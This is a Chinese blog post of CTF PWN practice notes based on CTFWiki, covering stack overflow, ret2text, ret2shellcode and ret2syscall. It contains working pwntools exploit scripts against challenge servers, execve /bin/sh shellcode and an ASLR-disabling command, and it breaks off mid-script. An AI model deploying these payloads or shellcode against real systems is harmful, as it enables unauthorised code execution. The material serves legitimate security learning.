<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="utf-8">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
    <meta name="referrer" content="no-referrer">
    <meta name="renderer" content="webkit">
    <meta name="force-rendering" content="webkit">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Cache-Control" content="no-transform">
    <meta name="format-detection" content="telephone=no,email=no,adress=no">
    <meta name="generator" content="Hugo 0.55.5" />
    
    
        <title>CTF PWN刷题记录 CTFWiki_1栈溢出 - sudo ~</title>
    
    
    
<meta itemprop="name" content="CTF PWN刷题记录 CTFWiki_1栈溢出">
<meta itemprop="description" content="CTFWiki_1栈溢出">


<meta itemprop="datePublished" content="2019-02-20T00:17:21&#43;08:00" />
<meta itemprop="dateModified" content="2019-02-20T00:17:21&#43;08:00" />
<meta itemprop="wordCount" content="2408">



<meta itemprop="keywords" content="PWN,CTF," />

    <meta property="og:title" content="CTF PWN刷题记录 CTFWiki_1栈溢出" />
<meta property="og:description" content="CTFWiki_1栈溢出" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://vorblock.cc/post/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/" />

<meta property="og:image" content="https://vorblock.cc/favicon.svg" />

<meta property="og:image" content="https://my-md-1253484710.cos.ap-chengdu.myqcloud.com/tx.jpg" />
<meta property="article:published_time" content="2019-02-20T00:17:21&#43;08:00"/>
<meta property="article:modified_time" content="2019-02-20T00:17:21&#43;08:00"/>

    <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://vorblock.cc/favicon.svg"/>

<meta name="twitter:title" content="CTF PWN刷题记录 CTFWiki_1栈溢出"/>
<meta name="twitter:description" content="CTFWiki_1栈溢出"/>

    

    
    
    

    
    
    <meta property="description" content="CTFWiki_1栈溢出">
    
    

    

    <link rel="canonical" href="https://vorblock.cc/post/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/">
    <link rel="shortcut icon" href="/favicon.png">


    
    
    <style media="screen">
            html{font-size:100%;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;box-sizing:border-box}*,*:before,*:after{box-sizing:inherit}body{margin:0;padding:0;background:#282c34;color:#c6c6c7}button,input,select,textarea,label{margin:0;padding:0;font-family:inherit;font-size:inherit}img{max-width:100%}body{line-height:1.75}h1,h2,h3,h4,h5,h6{padding:0;line-height:1.25;text-align:center}h1{font-size:32px;font-weight:400}h2{font-size:22px;font-weight:700}h3,h4,h5,h6{font-size:19px;font-weight:700;text-align:left}blockquote{margin:1em 0;padding:0 2em;border-left:3px solid #ddd;font-style:oblique;background:#3f4545}pre,code{font-size:.9em}pre code{display:block;border:1px solid #ddd;padding:1em;overflow-x:auto;line-height:1.75}code{padding:.1rem .2rem;background:#0f5f5f;color:#282c34}pre code{background:#f3f1f1}ul,ol{padding:0 0 0 20px}li{margin:4px 0;padding:0}a{color:#c6c6c7;text-decoration:none;padding-bottom:2px;border-bottom:1px solid}sup a{border-bottom:none}hr{display:block;height:1px;border:0;border-top:1px solid;margin:50px auto;padding:0;max-width:300px}.copyright{text-align:center}.post-nav{display:flex;justify-content:space-between;font-weight:700}.nav-next{margin-left:1em;text-align:right}.nav-prev{margin-right:1em}.comments{margin-top:20px}body{width:960px;margin:0 auto;padding:30px 0}.masthead{width:260px;padding:20px 50px 20px 10px;float:left}.main{width:700px;padding:32px 10px 20px 50px;margin-left:260px;border-left:3px solid #000;min-height:calc(100vh - 60px)}.masthead h1{margin-top:0;margin-bottom:34px;padding:0;text-align:right;font-size:46px;line-height:58px}.masthead h1 a{border-bottom:none}.masthead .tagline{font-style:italic;text-align:right}.masthead .menu{margin-right:20px;direction:rtl}.masthead .menu a{direction:ltr}.masthead .menu ul ul{list-style:none;margin-left:10px;margin-right:10px}.masthead .menu li li::before{content:"•\00a\000a0\00a0"}.title h3.post-meta{font-family:lucida console,andale mono,stkaiti,kaiti,simkai,monospace;text-align:right;margin:0 0 20px}.title h3.post-meta .tags a{font-size:.8em}.title h3.post-meta .category a{font-size:.9em}#menu-check{display:none}#menu-label{display:none}.main .title h1{margin-top:0;margin-bottom:40px}.title h3{font-weight:400;text-align:center}.subtitle{font-size:.9em;color:#666}.footnotes{font-size:.9em}table{margin:auto;border-top:1px solid #666;border-bottom:1px solid #666}table thead th{border-bottom:1px solid #666}th,td{padding:5px}thead,tfoot,tr:nth-child(even){background:#f8f8f8}.toc{margin-top:100px}.unselectable{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}@-ms-viewport{width:device-width;}@viewport{width:device-width;}@media screen and (max-width:960px){body{width:auto;max-width:700px}.masthead{width:auto;float:none;text-align:center;margin-left:10px;margin-right:10px;padding:10px 10px 45px;border-bottom:3px solid #000}.main{width:auto;padding:20px 10px;margin-left:0;border-left:none;min-height:auto}.masthead h1{text-align:left;font-size:30px;margin-bottom:0;line-height:40px}.masthead .tagline{text-align:left;margin:0}.masthead .menu{direction:ltr;max-width:300px;margin-left:auto;margin-right:auto}.masthead #menu-label{position:absolute;top:30px;right:0}.masthead .menu ul{text-align:left;margin:0;padding:0;float:none}.masthead .menu ul ul{margin:0}.masthead .menu li{border-bottom:1px solid;list-style:none;margin:0;padding:0}.masthead .menu li:first-child{border-top:1px solid}.masthead .menu li li:last-child{border-bottom:none}.masthead .menu a{display:block;padding:15px 20px;border-bottom:none}.masthead .menu li li a{padding-left:30px}.masthead .menu li li::before{content:none}.masthead .menu li li a::before{content:"•\00a0\00a0\00a0"}#menu-label{display:inline-block;padding:0 20px;height:50px;cursor:pointer;line-height:50px;color:#333;font-size:20px;margin-top:10px}#menu-check~label .close-icon{display:none}#menu-check~label .open-icon{display:inline-block}#menu-check:checked~label .close-icon{display:inline-block}#menu-check:checked~label .open-icon{display:none}#menu-check~ul{display:none}#menu-check:checked~ul{display:block;margin-top:50px;margin-bottom:0}}@media screen and (max-width:720px){}@media screen and (max-width:480px){body{font-size:16px}h1{font-size:28px}h2{font-size:18px}h3,h4,h5,h6{font-size:16px}pre,code{font-size:12px}.masthead{padding-top:0}}body{font-family:Optima,lucida sans,Calibri,Candara,Arial,source-han-serif-sc,source han serif sc,source han serif cn,source han serif tc,source han serif tw,source han serif,songti sc,microsoft yahei,sans-serif}code{font-family:lucida console,andale mono,stkaiti,kaiti,simkai,monospace}pre code{font-family:Consolas,lucida console,Monaco,stkaiti,kaiti,simkai,monospace}.chroma{background-color:#f8f8f8}.chroma .x{color:#000}.chroma .err{color:#a40000}.chroma .lntd{vertical-align:top;padding:0;margin:0;border:0}.chroma .lntable{border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block}.chroma .hl{display:block;width:100%;background-color:#ffc}.chroma .lnt{margin-right:.4em;padding:0 .4em}.chroma .ln{margin-right:.4em;padding:0 .4em}.chroma .k{color:#204a87;font-weight:700}.chroma .kc{color:#204a87;font-weight:700}.chroma .kd{color:#204a87;font-weight:700}.chroma .kn{color:#204a87;font-weight:700}.chroma .kp{color:#204a87;font-weight:700}.chroma .kr{color:#204a87;font-weight:700}.chroma .kt{color:#204a87;font-weight:700}.chroma .n{color:#000}.chroma .na{color:#c4a000}.chroma .nb{color:#204a87}.chroma .bp{color:#3465a4}.chroma .nc{color:#000}.chroma .no{color:#000}.chroma .nd{color:#5c35cc;font-weight:700}.chroma .ni{color:#ce5c00}.chroma .ne{color:#c00;font-weight:700}.chroma .nf{color:#000}.chroma .fm{color:#000}.chroma .nl{color:#f57900}.chroma .nn{color:#000}.chroma .nx{color:#000}.chroma .py{color:#000}.chroma .nt{color:#204a87;font-weight:700}.chroma .nv{color:#000}.chroma .vc{color:#000}.chroma .vg{color:#000}.chroma .vi{color:#000}.chroma .vm{color:#000}.chroma .l{color:#000}.chroma .ld{color:#000}.chroma .s{color:#4e9a06}.chroma .sa{color:#4e9a06}.chroma .sb{color:#4e9a06}.chroma .sc{color:#4e9a06}.chroma .dl{color:#4e9a06}.chroma .sd{color:#8f5902;font-style:italic}.chroma .s2{color:#4e9a06}.chroma .se{color:#4e9a06}.chroma .sh{color:#4e9a06}.chroma .si{color:#4e9a06}.chroma .sx{color:#4e9a06}.chroma .sr{color:#4e9a06}.chroma .s1{color:#4e9a06}.chroma .ss{color:#4e9a06}.chroma .m{color:#0000cf;font-weight:700}.chroma .mb{color:#0000cf;font-weight:700}.chroma .mf{color:#0000cf;font-weight:700}.chroma .mh{color:#0000cf;font-weight:700}.chroma .mi{color:#0000cf;font-weight:700}.chroma .il{color:#0000cf;font-weight:700}.chroma .mo{color:#0000cf;font-weight:700}.chroma .o{color:#ce5c00;font-weight:700}.chroma .ow{color:#204a87;font-weight:700}.chroma .p{color:#000;font-weight:700}.chroma .c{color:#8f5902;font-style:italic}.chroma .ch{color:#8f5902;font-style:italic}.chroma .cm{color:#8f5902;font-style:italic}.chroma .c1{color:#8f5902;font-style:italic}.chroma .cs{color:#8f5902;font-style:italic}.chroma .cp{color:#8f5902;font-style:italic}.chroma .cpf{color:#8f5902;font-style:italic}.chroma .g{color:#000}.chroma .gd{color:#a40000}.chroma .ge{color:#000;font-style:italic}.chroma .gr{color:#ef2929}.chroma .gh{color:navy;font-weight:700}.chroma .gi{color:#00a000}.chroma .go{color:#000;font-style:italic}.chroma .gp{color:#8f5902}.chroma .gs{color:#000;font-weight:700}.chroma .gu{color:purple;font-weight:700}.chroma .gt{color:#a40000;font-weight:700}.chroma .gl{color:#000;text-decoration:underline}.chroma .w{color:#f8f8f8;text-decoration:underline}div#isso-thread .avatar>svg[data-hash=a0d752802ad5]{box-shadow:0 0 12px #b80f28;border-radius:50%}div#isso-thread a{border-bottom:none}
        </style>
        
    
    
        
        
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-140385231-1"></script>
        <script>
            window.dataLayer = window.dataLayer || [];
            function gtag() { dataLayer.push(arguments); }
            gtag('js', new Date());
            gtag('config', 'UA-140385231-1');
        </script>
        
        
    

</head>



<body class="post">
    <header class="masthead">
        <div class="header">
            <h1><a href="/">sudo ~</a></h1>
            
            <p class="tagline">Are You OK?</p>
            
        </div>
        
        <nav class="menu">
            <input id="menu-check" type="checkbox" />
            <label id="menu-label" for="menu-check" class="unselectable">
                <span class="icon close-icon">✕</span>
                <span class="icon open-icon">☰</span>
                <span class="text">MENU</span>
            </label>
            <ul>
                
                    
                    <li>
                        <a href="/post/">/POSTS/~</a>
                    </li>
                
                    <li>
                        <a href="/todo/">/TODO/~</a>
                    </li>
                
                    <li>
                        <a href="/categories/">/CATEGORIES/~</a>
                    </li>
                
                    <li>
                        <a href="/tags/">/TAGS/~</a>
                    </li>
                
                    <li>
                        <a href="/about/">/ABOUT/~</a>
                    </li>
                
                    <li>
                        <a href="/reading/">/Reading/~</a>
                    </li>
                
                    <li>
                        <a href="/index.xml">/RSS</a>
                    </li>
                
            </ul>
            
        </nav>
        
    </header>

    <article class="main">
        <header class="title">
            
<h3 class="post-meta">
    
    <span itemprop="articleSection" class="category">
        
        <a href="/categories/PWN" rel="category">PWN</a>
        
        <a href="/categories/CTF" rel="category">CTF</a>
        
    </span>
    /
    
    
    <span itemprop="keywords" class="tags">
        
        <a href="/tags/PWN" rel="tag">PWN</a>
        
        <a href="/tags/CTF" rel="tag">CTF</a>
        
    </span>
    
</h3>


<h1>CTF PWN刷题记录 CTFWiki_1栈溢出</h1>

<h3>
    
    vorblock
    
      /  2019-02-20
</h3>

<hr>

        </header>
        <div class="container">
            

    
    
    

    
    
    

    

<hr />

<blockquote>
<p>看CTFWiki来入门CTF-PWN  (Linux和arm) 做个记录</p>
</blockquote>

<p>知识点：[PWN相关知识点总结]()</p>

<ul>
<li>Linux PWN</li>
<li>ARM PWN</li>
</ul>

<p>题目全部来源于 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/" target="_blank">CTFWiki</a> 上所涉及题目</p>

<h2 id="linux-pwn">Linux PWN</h2>

<p>大部分原理参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/" target="_blank">CTFWiki</a></p>

<h4 id="栈溢出">栈溢出</h4>

<h5 id="基本栈溢出">基本栈溢出</h5>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">void</span> <span class="nf">success</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You Hava already controlled it.&#34;</span><span class="p">);</span> <span class="p">}</span>
<span class="kt">void</span> <span class="nf">vulnerable</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">vulnerable</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp"># gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1
</span><span class="cp"></span><span class="n">stack1</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">In</span> <span class="n">function</span> <span class="err">‘</span><span class="n">vulnerable</span><span class="err">’</span><span class="o">:</span>
<span class="n">stack1</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">6</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span> <span class="nl">warning</span><span class="p">:</span> <span class="n">implicit</span> <span class="n">declaration</span> <span class="n">of</span> <span class="n">function</span> <span class="err">‘</span><span class="n">gets</span><span class="err">’</span><span class="p">;</span> <span class="n">did</span> <span class="n">you</span> <span class="n">mean</span> <span class="err">‘</span><span class="n">fgets</span><span class="err">’</span><span class="o">?</span> <span class="p">[</span><span class="o">-</span><span class="n">Wimplicit</span><span class="o">-</span><span class="n">function</span><span class="o">-</span><span class="n">declaration</span><span class="p">]</span>
   <span class="n">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
   <span class="o">^~~~</span>
   <span class="n">fgets</span>
<span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ccNeCYTO</span><span class="p">.</span><span class="nl">o</span><span class="p">:</span> <span class="n">In</span> <span class="n">function</span> <span class="err">`</span><span class="n">vulnerable</span><span class="err">&#39;</span><span class="o">:</span>
<span class="n">stack1</span><span class="p">.</span><span class="nl">c</span><span class="p">:(.</span><span class="n">text</span><span class="o">+</span><span class="mh">0x45</span><span class="p">)</span><span class="o">:</span> <span class="nl">warning</span><span class="p">:</span> <span class="n">the</span> <span class="err">`</span><span class="n">gets</span><span class="err">&#39;</span> <span class="n">function</span> <span class="n">is</span> <span class="n">dangerous</span> <span class="n">and</span> <span class="n">should</span> <span class="n">not</span> <span class="n">be</span> <span class="n">used</span><span class="p">.</span></code></pre></div>
<p><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>

<p>关闭完全部保护</p>

<p>步骤：查看gets()写入的地址距离ebp的长度（计算填充长度）-&gt;+ebp的长度-&gt;+返回的地址（success()的地址)</p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406211946.png" alt="" /></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406212108.png" alt="" /></p>

<p>poc1.py</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding=utf-8</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># sh = process(&#34;./stack1&#34;)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.106.212.155&#34;</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
<span class="n">success_addr</span> <span class="o">=</span> <span class="mh">0x08048456</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x14</span> <span class="o">+</span> <span class="s1">&#39;bbbb&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">success_addr</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406212343.png" alt="" /></p>

<hr />

<h5 id="基本rop">基本ROP</h5>

<p>ROP 攻击一般得满足如下条件</p>

<ul>
<li>程序存在溢出，并且可以控制返回地址。</li>
<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
</ul>

<h6 id="ret2text">ret2text</h6>

<p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。</p>

<p>示例程序：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank">ret2text</a></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406214601.png" alt="" /></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190412180957.png" alt="" /></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406220340.png" alt="" /></p>

<p>所以只需ret到<code>0x0804863a</code>就能getshell</p>

<p>构造payload</p>

<ul>
<li><p>计算偏移量</p>

<ul>
<li>使用ragg2</li>
</ul></li>
</ul>

<p><code>ragg2 -P 200 -r &gt; pattern.txt</code>   or <code>ragg2 -P 200 -r</code>复制下来</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">   <span class="c1"># ragg2 -P 200 -r</span>
  AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA#</code></pre></div>
<p>profile.rr2:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">  <span class="cp">#!/usr/bin/rarun2
</span><span class="cp"></span>  <span class="nv">stdin</span><span class="o">=</span>./pattern.txt</code></pre></div>
<p><code>r2 -R profile.rr2 -d ret2text</code> or 直接<code>r2 -d ret2text</code></p>

<p><code>dc</code>后输入复制的pattern字符串</p>

<p><code>wopO eip</code>得到偏移</p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406231721.png" alt="" /></p>

<ul>
<li><p>gdb手动计算</p>

<p>下断点call处：<code>0x080486ae</code></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406233003.png" alt="" /></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406233035.png" alt="" /></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190412181030.png" alt="" /></p>

<p>所以偏移为108+4</p></li>

<li><p>python pattern.py</p></li>

<li><p>payload</p></li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">  <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
  
  <span class="c1"># sh = process(./ret2text)</span>
  <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.106.212.155&#34;</span><span class="p">,</span><span class="mi">10001</span><span class="p">)</span>
  <span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x0804863a</span>
  <span class="n">payload</span> <span class="o">=</span> <span class="mi">112</span><span class="o">*</span><span class="s1">&#39;A&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
  <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
  <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190412181108.png" alt="" /></p>

<h6 id="ret2shellcode">ret2shellcode</h6>

<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank">ret2shellcode</a></p>

<ul>
<li>运行时shellcode所在区域应具有可执行权限</li>
</ul>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407123948.png" alt="" /></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407132349.png" alt="" /></p>

<p>strncpy函数将gets的内容复制到buf2 buf存放到.bss段的[0x804a080:4]位置。</p>

<p>调试看所在.bss段是否有执行的权限。</p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407132843.png" alt="" /></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407133456.png" alt="" /></p>

<p>payload:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding:utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
<span class="c1"># sh = process(./ret2shellcode)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.106.212.155&#34;</span><span class="p">,</span><span class="mi">10002</span><span class="p">)</span>
<span class="c1">## 获得system(&#34;bin/sh&#34;)的asm</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
<span class="n">buf2_addr</span> <span class="o">=</span> <span class="mh">0x804a080</span>
<span class="c1"># sh.sendline(shellcode+&#34;\x90&#34;*(112-len(shellcode))+p32(buf2_addr))</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">112</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf2_addr</span><span class="p">))</span>
<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407134402.png" alt="" /></p>

<p>练习题：sniperoj-pwn100-shellcode-x86-64</p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407140954.png" alt="" /></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407144021.png" alt="" /></p>

<p>偏移：<code>var void *buf @ rbp-0x10</code>   shellcode可用空间：16+8=24</p>

<p>找shellcode  <a href="https://www.exploit-db.com/" target="_blank">https://www.exploit-db.com/</a></p>

<p><a href="http://shell-storm.org/shellcode/" target="_blank">http://shell-storm.org/shellcode/</a></p>
<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm">    <span class="na">.global</span> <span class="no">_start</span>
<span class="nl">_start:</span>
    <span class="c"># char *const argv[]
</span><span class="c"></span>    <span class="nf">xorl</span> <span class="nv">%esi</span><span class="p">,</span> <span class="nv">%esi</span>

    <span class="c"># &#39;h&#39; &#39;s&#39; &#39;/&#39; &#39;/&#39; &#39;n&#39; &#39;i&#39; &#39;b&#39; &#39;/&#39;
</span><span class="c"></span>    <span class="nf">movq</span> <span class="no">$0x68732f2f6e69622f</span><span class="p">,</span> <span class="nv">%rbx</span>

    <span class="c"># for &#39;\x00&#39;
</span><span class="c"></span>    <span class="nf">pushq</span> <span class="nv">%rsi</span>

    <span class="nf">pushq</span> <span class="nv">%rbx</span>

    <span class="nf">pushq</span> <span class="nv">%rsp</span>
    <span class="c"># const char *filename
</span><span class="c"></span>    <span class="nf">popq</span> <span class="nv">%rdi</span>

    <span class="c"># __NR_execve 59
</span><span class="c"></span>    <span class="nf">pushq</span> <span class="no">$59</span>
    <span class="nf">popq</span> <span class="nv">%rax</span>

    <span class="c"># char *const envp[]
</span><span class="c"></span>    <span class="nf">xorl</span> <span class="nv">%edx</span><span class="p">,</span> <span class="nv">%edx</span>

    <span class="nf">syscall</span>
 <span class="err">*/</span>

<span class="err">/*</span>
  <span class="nf">gcc</span> <span class="p">-</span><span class="no">z</span> <span class="no">execstack</span> <span class="no">push64.c</span>

  <span class="nf">uname</span> <span class="p">-</span><span class="no">r</span>
  <span class="err">3</span><span class="nf">.19.3-3-ARCH</span>
 <span class="err">*/</span>
 <span class="nf">shellcode</span> <span class="err">=</span> <span class="err">&#34;\</span><span class="no">x31</span><span class="err">\</span><span class="no">xf6</span><span class="err">\</span><span class="no">x48</span><span class="err">\</span><span class="no">xbb</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x62</span><span class="err">\</span><span class="no">x69</span><span class="err">\</span><span class="no">x6e</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x73</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x56</span><span class="err">&#34;</span>
    <span class="err">&#34;\</span><span class="nf">x53</span><span class="err">\</span><span class="no">x54</span><span class="err">\</span><span class="no">x5f</span><span class="err">\</span><span class="no">x6a</span><span class="err">\</span><span class="no">x3b</span><span class="err">\</span><span class="no">x58</span><span class="err">\</span><span class="no">x31</span><span class="err">\</span><span class="no">xd2</span><span class="err">\</span><span class="no">x0f</span><span class="err">\</span><span class="no">x05</span><span class="err">&#34;;</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding:utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># context(log_level = &#39;debug&#39;,arch =&#39;x64&#39;,os = &#39;linux&#39; )</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./shellcode&#39;</span><span class="p">)</span>
<span class="c1"># io = remote(&#34;47.106.212.155&#34;,10003)</span>
<span class="n">shellcode</span> <span class="o">=</span>     <span class="s2">&#34;</span><span class="se">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><span class="s2">&#34;</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">)</span>
<span class="n">buf_addr</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;]&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">buf_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
<span class="c1"># print(buf_addr)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="o">+</span><span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
<span class="c1"># 32是24字节的填充数据长度加返回地址长度24+8</span>
<span class="k">print</span> <span class="n">payload</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
<h6 id="ret2syscall">ret2syscall</h6>

<p>控制程序执行系统调用</p>

<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank">ret2syscall</a></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407152204.png" alt="" /></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407152706.png" alt="" /></p>

<p>相对ebp的偏移为0x64=108  覆盖范围为+4=112</p>

<p>没法ret2text,也没法ret2shellcode</p>

<p>只有使用系统调用来getshell。执行 int 0x80即可执行对应的系统调用</p>

<pre><code>execve(&quot;/bin/sh&quot;,NULL,NULL)
</code></pre>

<p>使用ROPgadget寻找gadgets</p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407155958.png" alt="" /></p>

<p>这样就能够控制到eax,ebx,ecx,edx寄存器。</p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407160123.png" alt="" /></p>

<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407160710.png" alt="" /></p>

<p>写payload:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding:utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
<span class="c1"># io = process(./ret2syscall)</span>
